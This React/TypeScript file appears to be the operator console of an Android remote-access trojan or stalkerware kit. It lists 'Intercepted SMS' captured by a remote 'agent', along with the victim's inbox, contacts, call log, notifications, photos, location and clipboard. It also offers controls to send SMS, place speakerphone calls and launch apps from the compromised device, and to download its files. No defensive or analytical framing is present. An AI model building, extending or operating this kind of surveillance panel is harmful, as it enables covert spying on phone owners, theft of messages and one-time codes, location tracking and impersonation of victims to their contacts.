import { useCallback, useState } from "react";
import { toast } from "sonner";
import {
  Copy, Download, ExternalLink, MessageSquareText, MoreHorizontal, PhoneCall, RefreshCw, Search, Send, SquareArrowOutUpRight,
} from "lucide-react";
import { postOp } from "@/lib/api";
import { useConsole } from "@/state";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import {
  Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle,
} from "@/components/ui/dialog";
import {
  DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuSeparator, DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import { DataTable, type Column } from "@/components/data-table";

type Row = Record<string, any>;

const ROW_ARGS: Record<string, Record<string, unknown>> = {
  contacts: { n: 200 }, smsin: { n: 50 }, calllog: { n: 50 }, notifs: { n: 50 }, photos: { n: 50 },
};

async function copyText(t: string, label = "copied") {
  try { await navigator.clipboard.writeText(t); toast.success(label); }
  catch { toast.error("clipboard blocked"); }
}

async function downloadRemote(cid: string, rpath: string) {
  toast("downloading " + rpath.split("/").pop() + "…");
  try {
    const q = new URLSearchParams({ cid, path: rpath, name: rpath.split("/").pop() || "file.bin" });
    const res = await fetch("/api/download?" + q);
    if (!res.ok) throw new Error("download failed");
    const blob = await res.blob();
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = rpath.split("/").pop() || "file.bin";
    a.click();
    URL.revokeObjectURL(a.href);
    toast.success("saved " + a.download);
  } catch (e) { toast.error(String(e instanceof Error ? e.message : e)); }
}

const numCls = "font-mono text-xs text-muted-foreground whitespace-nowrap";

const TAB_LABELS: [string, string][] = [
  ["log", "Intercepted SMS"], ["smsin", "Inbox SMS"], ["contacts", "Contacts"], ["calllog", "Calls"],
  ["notifs", "Notifications"], ["apps", "Apps"], ["photos", "Photos"], ["perms", "Permissions"],
  ["info", "Device info"], ["loc", "Location"], ["clipget", "Clipboard"],
];
const kindOf = (id: string) => (id === "info" ? "info" : id === "loc" || id === "clipget" ? "text" : "rows");
const emptyOf: Record<string, string> = {
  log: "no intercepted SMS yet — messages appear when the agent captures them",
  smsin: "inbox is empty", contacts: "no contacts returned", calllog: "call log is empty",
  notifs: "no captured notifications", apps: "no packages returned", photos: "no photos returned",
  perms: "no permissions returned",
};

export default function DataView() {
  const { snapshot } = useConsole();
  const cid = snapshot?.active ?? null;

  const [tab, setTab] = useState("log");
  const [data, setData] = useState<Record<string, { ts: number; payload: any } | undefined>>({});
  const [filter, setFilter] = useState("");
  const [busy, setBusy] = useState(false);

  // compose dialog (sms / call)
  const [compose, setCompose] = useState<{ mode: "sms" | "call"; number: string } | null>(null);
  const [composeText, setComposeText] = useState("");
  // record viewer (intercepted sms)
  const [record, setRecord] = useState<Row | null>(null);

  const fetchTab = useCallback(async (id: string, force = false) => {
    if (!cid) return;
    setBusy(true);
    try {
      const payload = await postOp(id, ROW_ARGS[id] ?? {}, { refresh: force });
      setData((prev) => ({ ...prev, [id]: { ts: Date.now(), payload } }));
    } catch (e) {
      setData((prev) => ({ ...prev, [id]: { ts: Date.now(), payload: { error: String(e instanceof Error ? e.message : e) } } }));
    }
    setBusy(false);
  }, [cid]);

  if (!cid) {
    return (
      <div className="text-center py-14 text-muted-foreground">
        <p className="text-sm">No session selected.</p>
        <p className="text-xs font-mono mt-1 opacity-70">pick an agent from the strip above to pull its data</p>
      </div>
    );
  }

  const send = async () => {
    if (!compose) return;
    try {
      if (compose.mode === "sms") {
        if (!composeText) { toast.error("message required"); return; }
        await postOp("sms", { number: compose.number, text: composeText });
        toast.success(`SMS sent to ${compose.number}`);
      } else {
        await postOp("call", { number: compose.number });
        toast.success(`calling ${compose.number}`);
      }
      setCompose(null);
      setComposeText("");
    } catch (e) { toast.error(String(e instanceof Error ? e.message : e)); }
  };

  const itemCls = "cursor-pointer";
  const menu = (items: React.ReactNode) => (
    <DropdownMenu>
      <DropdownMenuTrigger asChild>
        <Button variant="ghost" size="icon" className="size-7"><MoreHorizontal className="size-4" /></Button>
      </DropdownMenuTrigger>
      <DropdownMenuContent align="end" className="min-w-44">{items}</DropdownMenuContent>
    </DropdownMenu>
  );

  const smsTo = (number: string) => { setCompose({ mode: "sms", number }); setComposeText(""); };
  const callTo = (number: string) => setCompose({ mode: "call", number });

  const actionsFor = (id: string): ((r: Row) => React.ReactNode) | undefined => {
    switch (id) {
      case "log":
        return (r) => menu(<>
          <DropdownMenuItem className={itemCls} onClick={() => setRecord(r)}>View record</DropdownMenuItem>
          <DropdownMenuItem className={itemCls} onClick={() => copyText(r.body, "message copied")}>
            <Copy /> Copy message
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuItem className={itemCls} onClick={() => smsTo(r.from)}>
            <MessageSquareText /> Reply by SMS
          </DropdownMenuItem>
        </>);
      case "smsin":
        return (r) => menu(<>
          <DropdownMenuItem className={itemCls} onClick={() => smsTo(r.from)}>
            <MessageSquareText /> Reply by SMS
          </DropdownMenuItem>
          <DropdownMenuItem className={itemCls} onClick={() => copyText(r.body, "message copied")}>
            <Copy /> Copy message
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuItem className={itemCls} onClick={() => callTo(r.from)}>
            <PhoneCall /> Call sender
          </DropdownMenuItem>
        </>);
      case "contacts":
        return (r) => menu(<>
          <DropdownMenuItem className={itemCls} onClick={() => smsTo(r.number)}>
            <MessageSquareText /> Send SMS
          </DropdownMenuItem>
          <DropdownMenuItem className={itemCls} onClick={() => callTo(r.number)}>
            <PhoneCall /> Call
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuItem className={itemCls} onClick={() => copyText(r.number, "number copied")}>
            <Copy /> Copy number
          </DropdownMenuItem>
        </>);
      case "calllog":
        return (r) => menu(<>
          <DropdownMenuItem className={itemCls} onClick={() => callTo(r.number)}>
            <PhoneCall /> Call back
          </DropdownMenuItem>
          <DropdownMenuItem className={itemCls} onClick={() => smsTo(r.number)}>
            <MessageSquareText /> Send SMS
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuItem className={itemCls} onClick={() => copyText(r.number, "number copied")}>
            <Copy /> Copy number
          </DropdownMenuItem>
        </>);
      case "notifs":
        return (r) => menu(<>
          <DropdownMenuItem className={itemCls} onClick={() => copyText(r.content, "content copied")}>
            <Copy /> Copy content
          </DropdownMenuItem>
        </>);
      case "apps":
        return (r) => menu(<>
          <DropdownMenuItem className={itemCls} onClick={async () => {
            try { await postOp("startapp", { pkg: r.pkg }); toast.success(`launched ${r.pkg}`); }
            catch (e) { toast.error(String(e instanceof Error ? e.message : e)); }
          }}>
            <SquareArrowOutUpRight /> Launch app
          </DropdownMenuItem>
          <DropdownMenuItem className={itemCls} onClick={() => copyText(r.pkg, "package copied")}>
            <Copy /> Copy package
          </DropdownMenuItem>
        </>);
      case "photos":
        return (r) => menu(<>
          <DropdownMenuItem className={itemCls} onClick={() => downloadRemote(cid, r.path)}>
            <Download /> Get file
          </DropdownMenuItem>
          <DropdownMenuItem className={itemCls} onClick={() => copyText(r.path, "path copied")}>
            <Copy /> Copy path
          </DropdownMenuItem>
        </>);
      default:
        return undefined;
    }
  };

  const columnsFor = (id: string): Column[] => {
    switch (id) {
      case "log": return [
        { key: "time", head: "Time", class: numCls },
        { key: "from", head: "Sender", class: "font-mono text-xs text-primary whitespace-nowrap" },
        { key: "body", head: "Message", class: "max-w-[440px] truncate" },
      ];
      case "smsin": return [
        { key: "from", head: "From", class: "font-mono text-xs text-primary whitespace-nowrap" },
        { key: "date", head: "Date", class: numCls },
        { key: "body", head: "Message", class: "max-w-[400px] truncate" },
      ];
      case "contacts": return [
        { key: "name", head: "Name" },
        { key: "number", head: "Number", class: "font-mono text-xs text-emerald-500" },
      ];
      case "calllog": return [
        { key: "type", head: "Type", value: (r) => r.type, render: (r) => (
          <Badge variant={r.type === "in" ? "default" : r.type === "out" ? "secondary" : r.type === "missed" ? "destructive" : "outline"} className="font-mono text-[10px]">
            {String(r.type)}
          </Badge>
        )},
        { key: "number", head: "Number", class: "font-mono text-xs" },
        { key: "date", head: "Date", class: numCls },
        { key: "duration", head: "Duration", class: "text-right font-mono text-xs", value: (r) => Number(r.duration) || 0 },
      ];
      case "notifs": return [
        { key: "time", head: "Time", class: numCls },
        { key: "pkg", head: "Package", class: "font-mono text-xs text-primary whitespace-nowrap" },
        { key: "content", head: "Content", class: "max-w-[460px] truncate" },
      ];
      case "apps": return [
        { key: "pkg", head: "Package", class: "font-mono text-xs" },
        { key: "system", head: "Type", value: (r) => (r.system ? "system" : "user"), render: (r) => (
          <Badge variant={r.system ? "outline" : "default"} className="font-mono text-[10px]">{r.system ? "system" : "user"}</Badge>
        )},
      ];
      case "photos": return [
        { key: "path", head: "Path", class: "font-mono text-xs break-all max-w-[420px]" },
        { key: "date", head: "Added", class: numCls },
      ];
      case "perms": return [
        { key: "perm", head: "Permission", class: "font-mono text-xs" },
        { key: "granted", head: "Status", value: (r) => (r.granted ? "granted" : "denied"), render: (r) => (
          <Badge variant={r.granted ? "default" : "destructive"} className="font-mono text-[10px]">{r.granted ? "granted" : "denied"}</Badge>
        )},
      ];
      default: return [];
    }
  };

  const entry = data[tab];
  const meta = entry ? `updated ${new Date(entry.ts).toTimeString().slice(0, 8)}` : "";
  const kind = kindOf(tab);

  let rows: Row[] = [];
  if (entry?.payload?.rows) rows = entry.payload.rows;
  if (filter) rows = rows.filter((r) => JSON.stringify(r).toLowerCase().includes(filter.toLowerCase()));

  return (
    <div className="max-w-[1400px] space-y-3">
      <Tabs value={tab} onValueChange={(v) => { setTab(v); setFilter(""); }}>
        <TabsList className="flex-wrap h-auto gap-0.5">
          {TAB_LABELS.map(([id, lbl]) => <TabsTrigger key={id} value={id} className="font-mono text-xs">{lbl}</TabsTrigger>)}
        </TabsList>
      </Tabs>

      <div className="flex items-center gap-3 flex-wrap">
        <Button size="sm" variant="secondary" disabled={busy} onClick={() => fetchTab(tab, true)}>
          <RefreshCw className={"size-3.5 mr-1" + (busy ? " animate-spin" : "")} /> Fetch
        </Button>
        {kind === "rows" && (
          <div className="relative">
            <Search className="size-3.5 absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
            <Input value={filter} onChange={(e) => setFilter(e.target.value)} placeholder="filter rows…" className="h-8 w-56 pl-8 font-mono text-xs" />
          </div>
        )}
        <span className="flex-1" />
        <span className="text-[11px] font-mono text-muted-foreground">{meta}</span>
      </div>

      {!entry ? (
        <p className="text-xs text-muted-foreground font-mono py-8 text-center">click Fetch to load this data</p>
      ) : entry.payload.error ? (
        <div className="text-center py-10 text-muted-foreground">
          <p className="text-sm text-red-400">{entry.payload.error}</p>
          <p className="text-xs font-mono mt-1 opacity-70">check that the agent is online, then fetch again</p>
        </div>
      ) : kind === "text" ? (
        <TextOut id={tab} text={entry.payload.text || "(empty)"} />
      ) : kind === "info" ? (
        <InfoCard f={entry.payload.info} />
      ) : (
        <DataTable
          columns={columnsFor(tab)}
          rows={rows}
          actions={actionsFor(tab)}
          empty={emptyOf[tab] ?? "no rows returned"}
        />
      )}

      {/* compose SMS / place call */}
      <Dialog open={!!compose} onOpenChange={(o) => !o && setCompose(null)}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>{compose?.mode === "sms" ? "Send SMS" : "Place call"}</DialogTitle>
          </DialogHeader>
          <div className="space-y-2">
            <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Number</Label>
            <Input value={compose?.number ?? ""} readOnly className="font-mono text-xs" />
            {compose?.mode === "sms" && (
              <>
                <Label className="text-[10px] uppercase tracking-wider text-muted-foreground font-mono">Message</Label>
                <Textarea value={composeText} onChange={(e) => setComposeText(e.target.value)} rows={3}
                  placeholder="message to send from the device" className="font-mono text-xs" autoFocus />
              </>
            )}
            {compose?.mode === "call" && (
              <p className="text-xs text-muted-foreground">A call is placed from the device on speakerphone.</p>
            )}
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setCompose(null)}>Cancel</Button>
            <Button onClick={send} disabled={compose?.mode === "sms" && !composeText}>
              <Send className="size-3.5 mr-1" /> {compose?.mode === "sms" ? "Send" : "Call"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* intercepted SMS record viewer */}
      <Dialog open={!!record} onOpenChange={(o) => !o && setRecord(null)}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle className="font-mono text-sm">Intercepted SMS · {record?.from}</DialogTitle>
          </DialogHeader>
          <div className="space-y-2 text-xs font-mono">
            <p className="text-muted-foreground">{record?.time} · {record?.file}</p>
            <div className="rounded-md border bg-muted/40 p-3 whitespace-pre-wrap break-words text-sm leading-relaxed">
              {record?.body || "(empty)"}
            </div>
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => copyText(record?.body || "", "message copied")}><Copy className="size-3.5 mr-1" /> Copy</Button>
            <Button variant="secondary" onClick={() => { if (record) smsTo(record.from); setRecord(null); }}>
              <MessageSquareText className="size-3.5 mr-1" /> Reply
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

function TextOut({ id, text }: { id: string; text: string }) {
  const isLoc = id === "loc";
  const latLon = isLoc ? text.match(/lat=(-?\d+\.\d+)\D+?lng=(-?\d+\.\d+)/) ?? text.match(/(-?\d+\.\d+)\D+?(-?\d+\.\d+)/) : null;
  return (
    <div className="rounded-lg border bg-card p-4 space-y-3">
      <pre className="font-mono text-xs whitespace-pre-wrap">{text}</pre>
      <div className="flex gap-2">
        <Button size="sm" variant="outline" onClick={() => copyText(text, "copied")}>
          <Copy className="size-3.5 mr-1" /> Copy
        </Button>
        {isLoc && latLon && (
          <a
            href={`https://www.google.com/maps?q=${latLon[1]},${latLon[2]}`}
            target="_blank" rel="noreferrer"
            className="inline-flex items-center gap-1.5 rounded-md border px-3 h-8 text-xs font-mono hover:bg-accent"
          >
            <ExternalLink className="size-3.5" /> Open in Maps
          </a>
        )}
      </div>
    </div>
  );
}

function InfoCard({ f }: { f: Record<string, string> | null }) {
  if (!f) return <p className="text-xs text-muted-foreground font-mono py-8 text-center">no info returned</p>;
  const rows: [string, string][] = [];
  const add = (k: string, v?: string) => { if (v) rows.push([k, v]); };
  add("model", f.model);
  add("android sdk", f.sdk);
  add("battery", f.battery_pct ? `${f.battery_pct}%${f.charging === "true" ? " · charging" : ""}` : undefined);
  add("ram", f.ram_avail_mb ? `${Number(f.ram_avail_mb).toLocaleString()} / ${Number(f.ram_total_mb).toLocaleString()} MB` : undefined);
  add("storage", f.storage_avail_gb ? `${f.storage_avail_gb} / ${f.storage_total_gb} GB` : undefined);
  add("uptime", f.uptime_s ? `${Math.floor(parseInt(f.uptime_s) / 3600)}h` : undefined);
  add("ips", f.ips?.replace(/,/g, ", "));
  return (
    <div className="rounded-lg border bg-card max-w-xl divide-y divide-border">
      {rows.map(([k, v]) => (
        <div key={k} className="flex px-4 py-2.5">
          <span className="w-40 font-mono text-[11px] uppercase tracking-wider text-muted-foreground">{k}</span>
          <span className="font-mono text-xs">{v}</span>
        </div>
      ))}
    </div>
  );
}
